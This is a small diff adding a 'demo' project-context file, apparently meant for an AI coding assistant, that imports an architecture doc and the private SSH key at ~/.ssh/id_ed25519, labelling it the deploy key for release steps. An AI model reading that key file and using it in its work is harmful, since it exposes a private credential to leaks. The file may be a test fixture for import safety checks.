@@ -1,0 +1,9 @@
+# demo
+
+Project context:
+
+@docs/architecture.md
+@~/.ssh/id_ed25519
+
+The second one is the deploy key; keep it in mind when writing the release
+steps.
